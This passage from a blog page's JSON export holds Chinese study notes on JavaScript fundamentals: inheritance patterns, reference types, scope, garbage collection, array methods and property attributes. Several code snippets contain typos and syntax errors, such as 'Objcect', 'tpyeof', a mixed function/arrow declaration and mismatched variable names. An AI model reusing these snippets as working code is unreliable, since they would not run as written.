class=\"hljs-keyword\">var</span> ins2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins2.<span class=\"hljs-property\">colors</span>);\t<span class=\"hljs-comment\">//red.green;\t//不会共享colors了；</span><br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"传递参数-1\"><a href=\"#传递参数-1\" class=\"headerlink\" title=\"传递参数\"></a>传递参数</h5><blockquote>\n<p>相比于原型链，借用构造函数有一个很大的优势，可以在子类型构造函数中向超累型构造函数传递参数；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义了一个colors属性</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-title function_\">call</span>(<span class=\"hljs-variable language_\">this</span>,<span class=\"hljs-string\">&quot;Martin&quot;</span>);\t\t<span class=\"hljs-comment\">//调用父类构造函数实际上为子类的实例设置了name属性；</span><br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">29</span>;\t\t<span class=\"hljs-comment\">//为了确保父类构造函数不会重写子类的属性，可以在调用父类构造函数忠厚添加子类定义的属性；</span><br>&#125;<br><br><span class=\"hljs-keyword\">var</span> ins=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins.<span class=\"hljs-property\">name</span>);\t\t<span class=\"hljs-comment\">//Martin</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins.<span class=\"hljs-property\">age</span>);\t\t<span class=\"hljs-comment\">//29</span><br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><blockquote>\n<p>仅仅借用构造函数，无法避免构造函数模式存在的问题：方法都在构造函数中定义，无法函数复用；</p>\n<p>超类原型定义的方法对子类而言也是不可见得；</p>\n</blockquote>\n<h4 id=\"（3）组合继承\"><a href=\"#（3）组合继承\" class=\"headerlink\" title=\"（3）组合继承\"></a>（3）组合继承</h4><blockquote>\n<p>组合继承：有时叫伪经典继承，指将原型链和借用构造函数的技术组合到一块儿，发挥二者之长的继承模式；</p>\n<p>背后的思路是使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承；</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JS高级程序设计\"><a href=\"#JS高级程序设计\" class=\"headerlink\" title=\"JS高级程序设计\"></a>JS高级程序设计</h1><h2 id=\"一、基础基础基础\"><a href=\"#一、基础基础基础\" class=\"headerlink\" title=\"一、基础基础基础\"></a>一、基础基础基础</h2><h3 id=\"1-基础语法\"><a href=\"#1-基础语法\" class=\"headerlink\" title=\"1.基础语法\"></a>1.基础语法</h3><ul>\n<li>for-in</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//for-in语法是一种精准的迭代语句，可以用来枚举对象的属性；</span><br><span class=\"hljs-keyword\">for</span>(property <span class=\"hljs-keyword\">in</span> expression)&#123;<br>    statement;<br>&#125;<br><br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> propName <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable language_\">window</span>)&#123;<br>    <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">write</span>(propName);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>with</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//将代码的作用域设置到一个特定的对象中</span><br><span class=\"hljs-title function_\">with</span>(expression) statement;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-变量、作用域、内存\"><a href=\"#2-变量、作用域、内存\" class=\"headerlink\" title=\"2.变量、作用域、内存\"></a>2.变量、作用域、内存</h3><ul>\n<li><h5 id=\"基本类型和引用类型的值\"><a href=\"#基本类型和引用类型的值\" class=\"headerlink\" title=\"基本类型和引用类型的值\"></a>基本类型和引用类型的值</h5></li>\n</ul>\n<p>基本数据类型（可以直接操作保存在变量中的实际的值）：Undefined、NULL、Boolean、Number、String；</p>\n<p>引用类型的值是保存在内存中的对象；</p>\n<p>与其他语言不同，JS不允许直接访问内存中的位置；在操作对象时，实际操作的是对象的引用；</p>\n<ul>\n<li><h5 id=\"复制变量值\"><a href=\"#复制变量值\" class=\"headerlink\" title=\"复制变量值\"></a>复制变量值</h5></li>\n</ul>\n<p>从一个变量向另一个变量复制基本类型和引用类型时存在不同；</p>\n<p>复制基本类型会创建基本类型的副本：</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/03/7a78a945b6267d99.jpg\"></p>\n<p>当一个变量赋值引用类型的值，同样也会将存储的值复制一份放到新变量分配的空间中国，不同的是，这个值的副本其实是一个指针，而这个指针指向存储在堆中的一个对象；</p>\n<p>复制结束后，两个变量实际上引用同一个对象；因此改变其中一个变量会改变另一个；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/03/18376e88b0eb8200.jpg\"></p>\n<ul>\n<li><h5 id=\"传递参数\"><a href=\"#传递参数\" class=\"headerlink\" title=\"传递参数\"></a>传递参数</h5></li>\n</ul>\n<p>ES中所有的参数都是按值传递的；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">num</span>)&#123;<br>    num+=<span class=\"hljs-number\">10</span>;<br>    <span class=\"hljs-keyword\">return</span> num;<br>&#125;<br><br><span class=\"hljs-keyword\">var</span> count=<span class=\"hljs-number\">20</span>;<br><span class=\"hljs-keyword\">var</span> result=<span class=\"hljs-title function_\">add</span>(count);<br><br><span class=\"hljs-comment\">//result=30,count=20不变</span><br><span class=\"hljs-comment\">//这是因为addTen()中的参数num是count的值传递，而不是引用传递两者是相互无关的。</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>检测类型</li>\n</ul>\n<p>要检测一个变量是不是基本类型？（typeof)</p>\n<p>检测基本数据类型时，typeof很好用，但是检测引用类型用处不大，需要使用instanceof;</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">tpyeof s;<br>variable <span class=\"hljs-keyword\">instanceof</span> constructor<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>作用域</li>\n</ul>\n<p>Web浏览器中，全局执行环境被认为是window对象；</p>\n<p>每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境会被推入一个环境栈中；</p>\n<p>代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chanin）：其作用是为了保证对执行环境有权访问的所有变量和函数有序的访问；</p>\n<ul>\n<li>延长作用域链</li>\n</ul>\n<p>有些语句可以在作用域链的前端临时增加一个变量对象，该变量对象在代码执行后被移除；</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs actionscript\"><span class=\"hljs-keyword\">try</span>-<span class=\"hljs-keyword\">catch</span>语句的<span class=\"hljs-keyword\">catch</span><br><span class=\"hljs-keyword\">with</span>语句<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-垃圾收集\"><a href=\"#3-垃圾收集\" class=\"headerlink\" title=\"3.垃圾收集\"></a>3.垃圾收集</h3><p>JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存。</p>\n<p>原理：找出不再使用的变量，释放内存；垃圾收集器按照固定时间间隔周期性执行；</p>\n<ul>\n<li>标记清除</li>\n</ul>\n<p>当变量进入环境，标记为进入环境，方法可能是设置标志位；</p>\n<ul>\n<li>引用计数</li>\n</ul>\n<p>记录每个值被引用的次数，当声明了一个变量并且将一个引用类型赋给该变量，则这个值的引用次数就是1；</p>\n<p>一个值赋给一个变量，引用次数+1；相反对这个值引用的变量右取得了另一个值，则引用次数-1；</p>\n<p>问题：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">problem</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> objA=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>();<br>    <span class=\"hljs-keyword\">var</span> objB=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title function_\">object</span>();<br>    <br>    objectA.<span class=\"hljs-property\">someOtherObject</span>=objectB;<br>    objectA.<span class=\"hljs-property\">anotherObject</span>=objectA;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>ObjectA和B通过各自的属性相互引用，两个对象的引用次数都是2；</p>\n<p>这会导致函数执行后继续存在，引用次数永远不会为0；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//解决方法</span><br>objA.<span class=\"hljs-property\">someOther</span>..=<span class=\"hljs-literal\">null</span>;<br>objB.<span class=\"hljs-property\">ano</span>..=<span class=\"hljs-literal\">null</span>;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>性能问题</li>\n<li>引用解除</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-params\">name</span>)&#123; <br> <span class=\"hljs-keyword\">var</span> localPerson = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>(); <br> localPerson.<span class=\"hljs-property\">name</span> = name; <br> <span class=\"hljs-keyword\">return</span> localPerson; <br>&#125; <br><span class=\"hljs-keyword\">var</span> globalPerson = <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-string\">&quot;Nicholas&quot;</span>); <br><span class=\"hljs-comment\">// 手工解除 globalPerson 的引用</span><br>globalPerson = <span class=\"hljs-literal\">null</span>; <br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-引用类型\"><a href=\"#4-引用类型\" class=\"headerlink\" title=\"4.引用类型\"></a>4.引用类型</h3><ul>\n<li>使用对象</li>\n<li>创建、操作数组</li>\n<li>理解基本的JS类型</li>\n<li>使用基本类型和基本包装类型</li>\n</ul>\n<blockquote>\n<p>引用类型的值（对象）是引用类型的一个实例；</p>\n</blockquote>\n<ul>\n<li><h5 id=\"Object类型\"><a href=\"#Object类型\" class=\"headerlink\" title=\"Object类型\"></a>Object类型</h5></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//创建Object实例</span><br><span class=\"hljs-comment\">//1.new操作符后跟Object构造函数</span><br><span class=\"hljs-keyword\">var</span> person=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>();<br>person.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br>person.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">29</span>;<br><br><span class=\"hljs-comment\">//2.对象字面量表示法</span><br><span class=\"hljs-keyword\">var</span> person=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">29</span>,<br>    <span class=\"hljs-string\">&quot;address&quot;</span>:<span class=\"hljs-string\">&quot;江苏省东南大学&quot;</span>\t\t\t<span class=\"hljs-comment\">//属性名可以使用字符串，最后一个属性后不加逗号，会在早的版本导致错误</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><h5 id=\"Array类型\"><a href=\"#Array类型\" class=\"headerlink\" title=\"Array类型\"></a>Array类型</h5></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//ES的数组每一项可以保存不同类型的数据；大小动态调整；</span><br><br><span class=\"hljs-comment\">//创建方式</span><br><span class=\"hljs-comment\">//1.Array构造函数；</span><br><span class=\"hljs-keyword\">var</span> colors=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Array</span>(<span class=\"hljs-number\">20</span>);<br><span class=\"hljs-keyword\">var</span> colors=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Array</span>(<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;blue&quot;</span>,<span class=\"hljs-string\">&quot;yellow&quot;</span>);<br><span class=\"hljs-comment\">//也可以省略new</span><br><span class=\"hljs-keyword\">var</span> colors=<span class=\"hljs-title class_\">Array</span>(<span class=\"hljs-number\">3</span>);<br><br><span class=\"hljs-comment\">//2.数组字面量表示法 </span><br><span class=\"hljs-keyword\">var</span> colors=[<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;blue&quot;</span>,<span class=\"hljs-string\">&quot;yellow&quot;</span>];<br><br><span class=\"hljs-keyword\">var</span> nums=[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,]\t\t<span class=\"hljs-comment\">//不要这样！！！</span><br><span class=\"hljs-keyword\">var</span> options=[，，，] <span class=\"hljs-comment\">//不要这样；</span><br><br><span class=\"hljs-comment\">//添加元素</span><br>color[color.<span class=\"hljs-property\">length</span>]=<span class=\"hljs-string\">&quot;black&quot;</span>;<br><br><span class=\"hljs-comment\">//检测数组instanceof 问题在于如果存在两个不同的Array构造函数，会出错；</span><br><span class=\"hljs-keyword\">if</span>(value <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">Array</span>)&#123;<br>    ...<br>&#125;<br>    <br><span class=\"hljs-comment\">//更好的方法</span><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title class_\">Array</span>.<span class=\"hljs-title function_\">isArray</span>(value))&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//转换方法</span><br><span class=\"hljs-keyword\">var</span> colors = [<span class=\"hljs-string\">&quot;red&quot;</span>, <span class=\"hljs-string\">&quot;blue&quot;</span>, <span class=\"hljs-string\">&quot;green&quot;</span>]; <span class=\"hljs-comment\">// 创建一个包含 3 个字符串的数组</span><br><span class=\"hljs-title function_\">alert</span>(colors.<span class=\"hljs-title function_\">toString</span>()); <span class=\"hljs-comment\">// red,blue,green </span><br><span class=\"hljs-title function_\">alert</span>(colors.<span class=\"hljs-title function_\">valueOf</span>()); <span class=\"hljs-comment\">// red,blue,green </span><br><span class=\"hljs-title function_\">alert</span>(colors); <span class=\"hljs-comment\">// red,blue,green。由于 alert()要接收字符串参数，所以它会在后台调用 toString()方法，由此会得到与直接调用 toString()方法相同的结果</span><br><br><span class=\"hljs-comment\">//栈方法</span><br>array.<span class=\"hljs-title function_\">push</span>();\t\t<span class=\"hljs-comment\">//尾部压入</span><br>array.<span class=\"hljs-title function_\">pop</span>();\t\t<span class=\"hljs-comment\">//尾部弹出</span><br><br><span class=\"hljs-comment\">//队列方法</span><br>array.<span class=\"hljs-title function_\">push</span>();\t\t<span class=\"hljs-comment\">//尾部入队</span><br>array.<span class=\"hljs-title function_\">shift</span>();\t\t<span class=\"hljs-comment\">//首部出队</span><br>array.<span class=\"hljs-title function_\">unshift</span>();\t<span class=\"hljs-comment\">//首部入队</span><br><br><span class=\"hljs-comment\">//重排序方法</span><br>array.<span class=\"hljs-title function_\">sort</span>();\t\t<span class=\"hljs-comment\">//升序排列，方法会调用每个数组项的 toString()转型方法，然后比较得到的字符串</span><br>array.<span class=\"hljs-title function_\">reverse</span>();\t<span class=\"hljs-comment\">//反转数组</span><br><br><span class=\"hljs-comment\">//sort方法可以接受一个比较函数</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">compare</span>(<span class=\"hljs-params\">value1, value2</span>) &#123; <br> <span class=\"hljs-keyword\">if</span> (value1 &lt; value2) &#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>; <br> &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (value1 &gt; value2) &#123; <br> <span class=\"hljs-keyword\">return</span> -<span class=\"hljs-number\">1</span>; <br> &#125; <span class=\"hljs-keyword\">else</span> &#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>; <br> &#125; <br>&#125; <br><span class=\"hljs-keyword\">var</span> values = [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">10</span>, <span class=\"hljs-number\">15</span>]; <br>values.<span class=\"hljs-title function_\">sort</span>(compare); <br><span class=\"hljs-title function_\">alert</span>(values); <span class=\"hljs-comment\">// 15,10,5,1,0</span><br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//操作方法</span><br><span class=\"hljs-comment\">//concat（）方法基于当前数组项创建一个新的数组；</span><br><span class=\"hljs-keyword\">var</span> colors=[<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;yellow&quot;</span>];<br><span class=\"hljs-keyword\">var</span> colors2=colors.<span class=\"hljs-title function_\">concat</span>(<span class=\"hljs-string\">&quot;green&quot;</span>,[<span class=\"hljs-string\">&quot;blue&quot;</span>,<span class=\"hljs-string\">&quot;grey&quot;</span>]);<br><br><span class=\"hljs-comment\">//slice（）方法接受一或者两个参数，为岂止位置；</span><br><span class=\"hljs-comment\">//slice方法不会影响原始数组；</span><br><span class=\"hljs-keyword\">var</span> colors = [<span class=\"hljs-string\">&quot;red&quot;</span>, <span class=\"hljs-string\">&quot;green&quot;</span>, <span class=\"hljs-string\">&quot;blue&quot;</span>, <span class=\"hljs-string\">&quot;yellow&quot;</span>, <span class=\"hljs-string\">&quot;purple&quot;</span>]; <br><span class=\"hljs-keyword\">var</span> colors2 = colors.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">1</span>); <br><span class=\"hljs-keyword\">var</span> colors3 = colors.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">4</span>); <br><br><span class=\"hljs-comment\">//splice()方法</span><br><span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">2</span>);  <span class=\"hljs-comment\">//删除前两项</span><br><span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;green&quot;</span>)  <span class=\"hljs-comment\">//从位置2开始插入red,green;</span><br><span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-string\">&quot;red&quot;</span>)\t\t\t<span class=\"hljs-comment\">//替换第二项为red；</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//位置方法</span><br><span class=\"hljs-title function_\">indexOf</span>()\t\t\t<span class=\"hljs-comment\">//从头开始查找</span><br><span class=\"hljs-title function_\">lastIndexOf</span>()\t\t<span class=\"hljs-comment\">//从尾部开始查找</span><br><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-迭代方法\"><a href=\"#5-迭代方法\" class=\"headerlink\" title=\"5.迭代方法\"></a>5.迭代方法</h3><ul>\n<li>every():对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。</li>\n<li>some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。</li>\n<li>filter():对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组.</li>\n<li>foreach():：对数组中的每一项运行给定函数。这个方法没有返回值。</li>\n<li>map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。</li>\n</ul>\n<h3 id=\"6-归并方法\"><a href=\"#6-归并方法\" class=\"headerlink\" title=\"6.归并方法\"></a>6.归并方法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//reduce():从第一项开始遍历；</span><br><span class=\"hljs-comment\">//reduceRight():从最后一项开始遍历；</span><br><span class=\"hljs-comment\">//接受的参数：prev,next，索引，数组对象</span><br><span class=\"hljs-keyword\">var</span> values=[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>];<br><span class=\"hljs-comment\">//第一次调用，pre=1.cur=2;第二次：pre=3(1+2的结果)，cur=3</span><br><span class=\"hljs-keyword\">var</span> sum=values.<span class=\"hljs-title function_\">reduce</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">prev,cur,index,array</span>)=&gt;&#123;<br>                      <span class=\"hljs-keyword\">return</span> prev+cur;<br>                      &#125;);<br><span class=\"hljs-title function_\">alert</span>(sum);\t\t\t\t<span class=\"hljs-comment\">//15</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-正则表达式\"><a href=\"#7-正则表达式\" class=\"headerlink\" title=\"7.正则表达式\"></a>7.正则表达式</h3><h2 id=\"二、面向对象的程序设计\"><a href=\"#二、面向对象的程序设计\" class=\"headerlink\" title=\"二、面向对象的程序设计\"></a>二、面向对象的程序设计</h2><ul>\n<li>理解对象属性</li>\n<li>理解并创建对象</li>\n<li>理解继承</li>\n</ul>\n<h3 id=\"1-属性类型\"><a href=\"#1-属性类型\" class=\"headerlink\" title=\"1.属性类型\"></a>1.属性类型</h3><blockquote>\n<p>ES中有两种属性：数据属性和访问器属性</p>\n</blockquote>\n<ul>\n<li>数据属性</li>\n</ul>\n<blockquote>\n<p>数据属性包含一个数据值的位置，在这个位置可以读取和写入值。</p>\n<ol>\n<li>Configurable：表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；</li>\n<li>Enumerable：表示是否可以通过for-in循环返回属性；默认为true;</li>\n<li>Writable:表示能否修改属性的值；默认为true；</li>\n<li>Value:数据值，默认为undefined；</li>\n</ol>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> person=&#123;&#125;;<br><span class=\"hljs-title class_\">Objcect</span>.<span class=\"hljs-title function_\">defineProperty</span>(person.<span class=\"hljs-string\">&quot;name&quot;</span>,&#123;<br>                       <span class=\"hljs-attr\">configuable</span>:<span class=\"hljs-literal\">false</span>,\t\t<span class=\"hljs-comment\">//一旦设置为false,就不能变回可配置的了；</span><br>                       <span class=\"hljs-attr\">writable</span>:<span class=\"hljs-literal\">false</span>,<br>                       <span class=\"hljs-attr\">value</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>，<br>                       &#125;);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">name</span>);\t\t<span class=\"hljs-comment\">//&quot;Martin&quot;</span><br>person.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Jack&quot;</span>;\t\t\t\t<span 